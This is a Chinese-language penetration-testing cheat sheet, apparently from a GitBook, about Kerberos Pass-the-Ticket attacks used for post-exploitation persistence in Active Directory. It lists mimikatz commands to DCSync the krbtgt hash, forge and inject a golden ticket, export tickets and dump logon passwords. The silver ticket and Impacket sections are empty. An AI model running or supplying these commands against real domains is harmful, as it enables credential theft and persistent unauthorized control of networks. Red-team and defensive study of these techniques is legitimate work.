---
description: 适用于在获取目标域内最高权限后的权限维持 / 后渗透密码收集 / 基于Kerberos认证
---

# ✔️ 票据传递攻击 - Pass The Ticket

## 黄金票据传递攻击

### 先决条件

* 已获得了目标域内用户krbtgt的密钥值（krntgt hash）
* 已获得了目标域的SID值
* 目标域名
* 要伪造的域用户（高权限账户：域管理员）

### 工具

#### Impacket



#### mimikatz.exe

```powershell
mimikatz.exe
# 提取krbtgt账户的NTLM哈希值 (DCSync攻击常用)
lsadump::dcsync /domain:target.com /user:krbtgt
# 生成黄金票据
kerberos::golden /user:administrator /domain:target.com /sid:域SID /krbtgt:312343xxxxxxxxxxx345435565789 /id:500 /target:target.com /renewal:票据的有效时间 /ticket:golden_ticket.kirbi
# 导入
kerberos::ptt golden_ticket.kirbi
# 验证
kerberos::list
# 持久化：可将生成的票据保存下来，后续继续使用
```

{% hint style="info" %}
提取NTLM哈希——生成黄金票据——导入伪造的黄金票据——验证票据——持久化
{% endhint %}

## 白银票据传递攻击

### 先决条件

* 已获得了目标域内服务账户的密钥值
* 已获得了目标域的SID值
* 目标域名
* 要伪造的域用户（高权限账户：域管理员）

### 工具

#### Impacket



#### mimikatz.exe







## 常用命令

### mimikatz.exe

```powershell
# 列出系统上的所有票据
sekurlsa::tickets /export
# 提升权限
privilege::debug
# 提取当前用户凭证
sekurlsa::logonpasswords
# 
```

{% hint style="info" %}
Kerberos协议是在位于**不受信任的网络中**的**受信任主机上**的**身份验证**协议，在域渗透的过程中主要是利用Kerberos票据来进行攻击，涉及黄金票据和白银票据传递，票据传递攻击本质上是冒充其他高权限用户。
{% endhint %}
